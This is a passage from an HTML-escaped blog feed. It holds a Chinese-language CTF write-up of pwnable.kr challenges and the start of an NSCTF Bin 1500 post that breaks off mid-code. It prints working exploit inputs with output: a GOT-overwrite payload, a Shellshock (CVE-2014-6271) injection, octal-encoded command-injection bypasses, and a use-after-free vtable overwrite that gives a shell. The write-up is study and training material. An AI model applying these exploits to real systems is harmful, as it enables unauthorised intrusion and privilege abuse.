class=&quot;line&quot;&gt;.text:08048583                 mov     [esp], eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048586                 call    ___isoc99_scanf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048590                 mov     [esp], eax      ; stream&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048593                 call    _fflush&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:08048598                 mov     eax, offset aEnterPasscode2 ; &amp;quot;enter passcode2 : &amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0804859D                 mov     [esp], eax      ; format&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:080485A0                 call    _printf&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;覆写 &lt;code&gt;printf@got.plt&lt;/code&gt; 为 &lt;code&gt;login ok&lt;/code&gt; 部分，改变程序流程：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~/p/5_passcode python -c &amp;apos;from pwn import *; print &amp;quot;A&amp;quot;*96+pack(0x804a000)+&amp;quot;134514135&amp;quot;&amp;apos; |./passcode     06:04:16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Toddler&amp;apos;s Secure Login System 1.0 beta.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;enter passcode1 : Login OK!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Done!!!!!!!!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Now I can safely trust you that you have credential :)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;6-random&quot;&gt;&lt;a href=&quot;#6-random&quot; class=&quot;headerlink&quot; title=&quot;6. random&quot;&gt;&lt;/a&gt;6. random&lt;/h2&gt;&lt;p&gt;调用 &lt;code&gt;random&lt;/code&gt; 函数时未初始化种子，C 语言中用户未设定随机数种子时，系统默认的随机数种子为 1，导致返回值固定为 &lt;code&gt;1804289383&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;7-input&quot;&gt;&lt;a href=&quot;#7-input&quot; class=&quot;headerlink&quot; title=&quot;7. input&quot;&gt;&lt;/a&gt;7. input&lt;/h2&gt;&lt;p&gt;考察的是 C 语言中各种参数的传递，通过 C 编程解决：&lt;a href=&quot;http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;8-leg&quot;&gt;&lt;a href=&quot;#8-leg&quot; class=&quot;headerlink&quot; title=&quot;8. leg&quot;&gt;&lt;/a&gt;8. leg&lt;/h2&gt;&lt;p&gt;考察 ARM 平台的调试，从来没有做过 ARM ：（，在师傅的指导下终于做出来了。在 ARM 中，r0 相当于 EAX 用作返回值，pc 相当于下面第二条指令的地址，lr 相当于函数返回地址 ret。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;key1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008cdc &amp;lt;+8&amp;gt;: mov r3, pc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008ce0 &amp;lt;+12&amp;gt;:    mov r0, r3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008ce4 &amp;lt;+16&amp;gt;:    sub sp, r11, #0                 ； key1() = 0x00008ce4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;key2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d04 &amp;lt;+20&amp;gt;:    mov r3, pc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d06 &amp;lt;+22&amp;gt;:    adds    r3, #4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d08 &amp;lt;+24&amp;gt;:    push    &amp;#123;r3&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d0a &amp;lt;+26&amp;gt;:    pop &amp;#123;pc&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d0c &amp;lt;+28&amp;gt;:    pop &amp;#123;r6&amp;#125;        ; (ldr r6, [sp], #4)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d10 &amp;lt;+32&amp;gt;:    mov r0, r3                      ; key2() = 0x00008d08 + 4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;key3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d7c &amp;lt;+64&amp;gt;:    bl  0x8d20 &amp;lt;key3&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   0x00008d80 &amp;lt;+68&amp;gt;:    mov r3, r0                      ; key3() = 0x00008d80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/ $ ./leg &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Daddy has very strong arm! : 108400&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Congratz!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;My daddy has a lot of ARMv5te muscle!&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;9-mistake&quot;&gt;&lt;a href=&quot;#9-mistake&quot; class=&quot;headerlink&quot; title=&quot;9. mistake&quot;&gt;&lt;/a&gt;9. mistake&lt;/h2&gt;&lt;p&gt;误用了 C 函数 open 的 mode 参数，在存在 mode 参数时，open 的返回值为：若所有欲核查的权限都通过了检查则返回 0 值, 表示成功, 只要有一个权限被禁止则返回 -1。所以 &lt;code&gt;fd == 0&lt;/code&gt;，导致 pw_buf 从标准输入读入，在 IDA Pesudocode 中可以很清晰的看到：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;if ( (signed int)read(0, &amp;amp;buf, 10uLL) &amp;gt; 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  printf(&amp;quot;input password : &amp;quot;, &amp;amp;buf);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  __isoc99_scanf(&amp;quot;%10s&amp;quot;, &amp;amp;s2);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  xor((__int64)&amp;amp;s2, 10u);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( !strncmp(&amp;amp;buf, &amp;amp;s2, 0xAuLL) )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    puts(&amp;quot;Password OK&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    system(&amp;quot;/bin/cat flag\n&amp;quot;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;10-shellshock&quot;&gt;&lt;a href=&quot;#10-shellshock&quot; class=&quot;headerlink&quot; title=&quot;10. shellshock&quot;&gt;&lt;/a&gt;10. shellshock&lt;/h2&gt;&lt;p&gt;shellshock 漏洞：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;shellshock@ubuntu:~$ ./bash &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellshock@ubuntu:~$ export echo=&amp;quot;() &amp;#123; cat flag; &amp;#125;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellshock@ubuntu:~$ ./shellshock &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;only if I knew CVE-2014-6271 ten years ago..!!&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;11-coin1&quot;&gt;&lt;a href=&quot;#11-coin1&quot; class=&quot;headerlink&quot; title=&quot;11. coin1&quot;&gt;&lt;/a&gt;11. coin1&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%8A%98%E5%8D%8A%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;二分法&lt;/a&gt; 成功解决。坑点：网络速度不够，脚本需要扔到服务器上面跑：（&lt;/p&gt;
&lt;h2 id=&quot;12-blackjack&quot;&gt;&lt;a href=&quot;#12-blackjack&quot; class=&quot;headerlink&quot; title=&quot;12. blackjack&quot;&gt;&lt;/a&gt;12. blackjack&lt;/h2&gt;&lt;p&gt;TODO&lt;/p&gt;
&lt;h2 id=&quot;13-lotto&quot;&gt;&lt;a href=&quot;#13-lotto&quot; class=&quot;headerlink&quot; title=&quot;13. lotto&quot;&gt;&lt;/a&gt;13. lotto&lt;/h2&gt;&lt;p&gt;TODO&lt;/p&gt;
&lt;h2 id=&quot;14-cmd1&quot;&gt;&lt;a href=&quot;#14-cmd1&quot; class=&quot;headerlink&quot; title=&quot;14. cmd1&quot;&gt;&lt;/a&gt;14. cmd1&lt;/h2&gt;&lt;p&gt;shell 拼接字符串简单绕过：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cmd1@ubuntu:~$ ./cmd1 &amp;quot;/bin/cat &amp;apos;fl&amp;apos;&amp;apos;ag&amp;apos;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mommy now I get what PATH environment is for :)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;15-cmd2&quot;&gt;&lt;a href=&quot;#15-cmd2&quot; class=&quot;headerlink&quot; title=&quot;15. cmd2&quot;&gt;&lt;/a&gt;15. cmd2&lt;/h2&gt;&lt;p&gt;这题比上面的难了些，过滤了很多，通过 echo 的编码/转义搞定。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ #shell ascii&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ echo &amp;apos;\0101&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;A&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; ~ ipython                                                                                                                                                                 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;In [1]: from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;In [2]: cmd = &amp;quot;/bin/cat flag&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;In [3]: print &amp;quot;\\&amp;quot;+&amp;quot;\\&amp;quot;.join([oct(i) for i in ordlist(cmd)])&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cmd2@ubuntu:~$ ./cmd2 &amp;apos;$(echo &amp;quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&amp;quot;)&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$(echo &amp;quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;FuN_w1th_5h3ll_v4riabl3s_haha&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;16-uaf&quot;&gt;&lt;a href=&quot;#16-uaf&quot; class=&quot;headerlink&quot; title=&quot;16. uaf&quot;&gt;&lt;/a&gt;16. uaf&lt;/h2&gt;&lt;p&gt;典型的 UAF 漏洞，注意：先 free man，再 free woman，alloc 时会先获取到 woman 的空间，然后才是 man 空间，所以应该两次 alloc。&lt;br&gt;通过覆写虚表指针为虚表指针 - 8 获取 shell。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; /tmp ipython&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;In [1]: from pwn import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;In [2]: pack(0x401568)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Out[2]: &amp;apos;h\x15@\x00&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;In [3]: with open(&amp;apos;/tmp/123&amp;apos;, &amp;apos;w&amp;apos;) as fd:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   ...:     fd.write(pack(0x401568))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   ...: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; /tmp scp -P2222 123 uaf@pwnable.kr:/tmp/halo                                                                                                                                                                               14:22:26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;uaf@pwnable.kr&amp;apos;s password: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;123                                                                                                                                                                                                 100%    4     0.0KB/s   00:00    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;⋊&amp;gt; /tmp ssh uaf@pwnable.kr -p2222                                                                                                                                                                                             14:22:41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;uaf@pwnable.kr&amp;apos;s password: &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Last login: Mon Apr 11 23:09:42 2016 from 113.140.11.121&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;uaf@ubuntu:~$ ./uaf 24 /tmp/halo&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1. use&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2. after&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3. free&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1. use&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2. after&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3. free&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;your data is allocated&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1. use&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2. after&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3. free&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;your data is allocated&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1. use&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2. after&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3. free&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ id&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;uid=1069(uaf) gid=1069(uaf) egid=1070(uaf_pwn) groups=1069(uaf)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ ls&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;flag  uaf  uaf.cpp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$ cat flag&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;yay_f1ag_aft3r_pwning&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;和糖果师傅学 Linux Exploit，发现 pwnable.kr 上面的题目很有趣，边学边做。&lt;/p&gt;
&lt;h2 id=&quot;1-fd&quot;&gt;&lt;a href=&quot;#1-fd&quot; class=&quot;headerlink&quot; title=&quot;1. fd&quot;&gt;&lt;/a&gt;1. fd&lt;/h2&gt;&lt;p&gt;考察的是 Linux 文件描述符相关知识：
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>NSCTF Bin 1500</title>
    <link href="http://sh3ll.me/2015/09/28/nsctf-bin-1500/"/>
    <id>http://sh3ll.me/2015/09/28/nsctf-bin-1500/</id>
    <published>2015-09-28T07:30:58.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;实战中体验了次 DEP &amp;amp; ASLR 的绕过。&lt;/p&gt;
&lt;h2 id=&quot;Fuzz-溢出点&quot;&gt;&lt;a href=&quot;#Fuzz-溢出点&quot; class=&quot;headerlink&quot; title=&quot;Fuzz 溢出点&quot;&gt;&lt;/a&gt;Fuzz 溢出点&lt;/h2&gt;&lt;p&gt;题目里只给了个 PE 程序，运行程序后 &lt;code&gt;netstat -anbp tcp&lt;/code&gt; 可以看到程序正在监听 2994 端口。PEiD 查看发现是 AsPack 的壳，&lt;code&gt;ESP 定律&lt;/code&gt; 脱壳后丢到 IDA 中搜索欢迎信息（&lt;code&gt;shift F12&lt;/code&gt;），F5 得到如下伪代码：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int __cdecl sub_401120(SOCKET s)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  	··· SNIP ···&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      if ( !sub_4016BE(&amp;amp;buf, &amp;quot;ENCRYPT &amp;quot;, 8) ) &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        v12 = (int)&amp;amp;v10;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sub_4010C0(s, (int)&amp;amp;v10);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      if ( !sub_4016BE(&amp;amp;buf, &amp;quot;STATUS&amp;quot;, 7) )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        v4 = GetModuleHandleA(0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sub_405EB0(&amp;amp;buf, 0, 1452);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sub_40177E(&amp;amp;buf, 1452, &amp;quot;OK: Current Module Load @ 0x%.8X\n&amp;quot;, v4);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        send(s, &amp;amp;buf, strlen(&amp;amp;buf), 0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      if ( !sub_4016BE(&amp;amp;buf, &amp;quot;EXIT&amp;quot;, 4) )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sub_405EB0(&amp;amp;buf, 0, 1452);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sub_40179C(&amp;quot;Session 